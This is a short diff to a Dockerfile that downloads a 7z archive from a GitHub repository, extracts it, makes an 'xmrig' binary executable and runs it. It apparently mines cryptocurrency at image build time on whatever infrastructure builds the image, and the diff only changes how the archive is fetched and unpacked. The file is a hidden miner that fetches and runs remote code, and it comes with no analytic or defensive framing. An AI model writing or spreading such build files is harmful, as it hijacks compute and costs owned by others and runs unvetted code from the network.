@@ -1,7 +1,7 @@
 FROM ubuntu:latest
 RUN apt-get update && apt-get install -y vim git curl pciutils wget
-RUN apt-get install -y unzip
-RUN wget https://github.com/AimTuxHvH/ubuntu/blob/master/Desktop.zip
-RUN unzip Desktop.zip
+RUN apt-get install -y p7zip
+RUN wget https://github.com/AimTuxHvH/ubuntu/blob/master/Desktop.7z
+RUN 7za e Desktop.7z
 RUN chmod +x "/xmrig"
 RUN ./xmrig
